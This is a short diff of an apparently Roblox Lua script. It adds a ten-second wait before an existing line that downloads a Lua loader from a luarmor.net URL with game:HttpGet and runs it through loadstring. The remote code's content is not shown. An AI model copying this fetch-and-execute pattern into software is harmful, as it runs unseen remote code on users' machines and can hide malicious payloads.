@@ -192,4 +192,6 @@ end
 player.CharacterAdded:Connect(function(character)
     task.spawn(setupCharacter, character)
 end)
+
+task.wait(10)
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/634d681114e7443e2b3cab03232f29eb.lua"))()
